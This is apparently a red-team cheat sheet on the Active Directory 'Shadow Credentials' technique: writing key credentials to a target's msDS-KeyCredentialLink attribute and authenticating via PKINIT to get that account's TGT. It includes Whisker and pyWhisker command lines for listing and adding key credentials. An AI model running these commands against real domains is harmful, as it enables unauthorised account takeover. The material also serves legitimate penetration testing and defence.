# Shadow Credentials

## Tools: Whisker https://github.com/eladshamir/Whisker , pyWhisker https://github.com/ShutdownRepo/pywhisker , ShadowSpray https://github.com/Dec0ne/ShadowSpray/

### Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

## WARNING! User objects can't edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

## Requirements

#### 1) Domain Controller on (at least) Windows Server 2016

#### 2) Domain must have Active Directory Certificate Services and Certificate Authority configured

#### 3) PKINIT Kerberos authentication

#### 4) An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object

## Exploitation

## Windows

#### 1) # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.

 - Whisker.exe list /target:computername$

#### 2) # Generates a public-private key pair and adds a new key credential to the target object.

 - Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1

## Linux

 - python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
